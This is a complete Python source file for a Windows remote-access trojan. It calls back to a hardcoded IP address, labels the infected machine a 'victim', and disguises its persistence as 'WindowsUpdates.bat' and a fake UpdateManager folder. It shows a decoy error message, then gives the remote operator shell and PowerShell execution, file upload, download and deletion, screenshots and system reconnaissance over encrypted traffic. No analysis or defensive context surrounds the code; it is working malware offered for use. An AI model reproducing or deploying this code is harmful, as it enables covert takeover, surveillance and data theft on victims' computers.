import socket
import os
import subprocess
import platform
import getpass
import ctypes
import shutil
from cryptography.fernet import Fernet

key = b'7gBE0tVEzrYOLppvlPklI_vBn-IYnU1OH2UanvcYsIE='
cipher = Fernet(key)

def sendc(socket, message):
    encrypted = cipher.encrypt(message.encode())
    socket.send(encrypted)

def sendc_large(sock, message):
    encrypted_data = cipher.encrypt(message.encode())
    total_size = str(len(encrypted_data)).encode()
    encrypted_size = cipher.encrypt(total_size)

    sock.sendall(encrypted_size.ljust(256))

    for i in range(0, len(encrypted_data), 4096):
        sock.sendall(encrypted_data[i:i+4096])

def recvc(socket):
    data = socket.recv(4096)
    return cipher.decrypt(data).decode()

def get_filename(command):
    return command.split(' ', 1)[1] if ' ' in command else ''

def send_file(socket, filename):
    try:
        with open(filename, 'rb') as f:
            chunk = f.read(4096)
            while chunk:
                socket.send(chunk)
                chunk = f.read(4096)
        sendc(socket, "DONE")
    except Exception as e:
        sendc(socket, f"ERROR: {e}\n")

def receive_file(sockt, filename, filesize):
    sockt.settimeout(5)
    try:
        with open(filename, 'wb') as f:
            bytes_received = 0
            while bytes_received < filesize:
                data = sockt.recv(min(4096, filesize - bytes_received))
                if not data:
                    break
                f.write(data)
                bytes_received += len(data)
        
        recvc(sockt)
    finally:
        sockt.settimeout(None)

def handle_post(socket, command):
    filename = get_filename(command)
    sendc(socket, "OK")
    response = recvc(socket)

    if response.startswith("EXISTS"):
        filesize = int(response.split(' ')[1])
        sendc(socket, "READY")
        receive_file(socket, filename, filesize)
        sendc(socket, "Fitxer descarregat correctament\n")
    else:
        print(response)

def handle_get(socket, command):
    filename = get_filename(command)
    if os.path.exists(filename):
        file_size = os.path.getsize(filename)
        sendc(socket, f"EXISTS {file_size}")
        recvc(socket)
        send_file(socket, filename)
    else:
        sendc(socket, "ERROR: El fitxer no existeix\n")

def handle_ss(socket):
    filename = 'screenshot.png'
    capture_screenshot(filename)
    file_size = os.path.getsize(filename)
    sendc(socket, f"EXISTS {file_size}")
    recvc(socket)
    send_file(socket, filename)
    os.remove(filename)

def handle_info(sockt):
    try:
        info = [
            f"Sistema Operatiu: {platform.system()}",
            f"Versió: {platform.version()}",
            f"Hostname: {platform.node()}",
            f"IP: {socket.gethostbyname(platform.node())}",
            f"Usuari: {getpass.getuser()}"
        ]
        full_info = "\n".join(info)+ '\n'
        sendc(sockt, full_info)
    except Exception as e:
        sendc(sockt, f"ERROR: {e}\n")

def capture_screenshot(filename):
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    subprocess.run([
        "powershell", "-command",
        (
            "Add-Type -AssemblyName System.Windows.Forms; "
            "$bmp = New-Object Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, "
            "[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); "
            "$g = [Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen(0,0,0,0,$bmp.Size); "
            f"$bmp.Save('{filename}', [System.Drawing.Imaging.ImageFormat]::Png);"
        )
    ], startupinfo=startupinfo)

def activate_persistence(socket):
    try:
        startup_en = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
        startup_es = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Menú Inicio\\Programas\\Inicio')
        startup = startup_en if os.path.exists(startup_en) else startup_es
        if not os.path.exists(startup):
            return

        bat_path = os.path.join(startup, 'WindowsUpdates.bat')
        update_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\UpdateManager')

        bat_content = (
            '@echo off\n'
            'start "" "%APPDATA%\\Microsoft\\Windows\\UpdateManager\\Updates\\pythonw.exe" '
            '"%APPDATA%\\Microsoft\\Windows\\UpdateManager\\SysUpdate.py"\nexit'
        )
        os.makedirs(update_dir, exist_ok=True)
        with open(bat_path, 'w') as f:
            f.write(bat_content)
        shutil.copytree('Updates', os.path.join(update_dir, 'Updates'), dirs_exist_ok=True)
        shutil.copy('SysUpdate.py', update_dir)

    except Exception as e:
        sendc(socket, f"ERROR: {e}\n")

def mostrar_error():
    ctypes.windll.user32.MessageBoxW(0, "No tienes permisos par ver este documento.", "Error", 0x10)

def handle_command(socket, command):
    try:
        if command == 'exit':
            return False

        if command.startswith('info'):
            handle_info(socket)

        elif command.startswith('get'):
            handle_get(socket, command)

        elif command.startswith('post'):
            handle_post(socket, command)

        elif command.startswith('run'):
            filename = get_filename(command)
            if os.path.exists(filename):
                try:
                    result = subprocess.run(["cmd.exe", "/c", filename], capture_output=True, text=True, shell=True)
                    output = result.stdout + result.stderr
                    if not output.strip():
                        output = "Executat sense sortida visible.\n"
                    sendc(socket, output)
                except Exception as e:
                    sendc(socket, f"ERROR durant execució: {e}\n")
            else:
                sendc(socket, "ERROR El fitxer no existeix\n")

        elif command.startswith('dl'):
            filename = get_filename(command)
            if os.path.exists(filename):
                os.remove(filename)
                sendc(socket, f"Fitxer {filename} eliminat\n")
            else:
                sendc(socket, "ERROR El fitxer no existeix\n")

        elif command.startswith('ss'):
            handle_ss(socket)

        elif command.startswith('ps'):
            ps_command = get_filename(command)
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            result = subprocess.run(['powershell', '-command', ps_command], capture_output=True, text=True, startupinfo=startupinfo)
            output = result.stdout + result.stderr
            sendc_large(socket, output + '\n')

        elif command.startswith('cd'):
            path = get_filename(command)
            try:
                os.chdir(path)
                sendc(socket, f"Directori canviat a {os.getcwd()}\n")
            except Exception as e:
                sendc(socket, f"ERROR: {e}\n")

        elif command.startswith('ls'):
            try:
                files = os.listdir()
                sendc(socket, '\n'.join(files) + '\n')
            except Exception as e:
                sendc(socket, f"ERROR: {e}\n")

        elif command.startswith('path'):
            sendc(socket, os.getcwd() + '\n')

        else:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            sendc(socket, result.stdout + result.stderr)

    except Exception as e:
        sendc(socket, f"ERROR: {e}\n")

    return True

def main():
    host = '51.20.84.35'
    port = 5555

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    try:
        username = getpass.getuser()
        ip = socket.gethostbyname(socket.gethostname())
        ident_msg = f"victim::{username}::{ip}"
        sendc(s, ident_msg)
    except:
        sendc(s, "victim::desconegut::0.0.0.0")

    activate_persistence(s)
    mostrar_error()

    while True:
        try:
            command = recvc(s)
            if not command:
                break
            if not handle_command(s, command):
                break
        except Exception as e:
            print(f"[ERROR] {e}")
            break

    s.close()

if __name__ == '__main__':
    main()
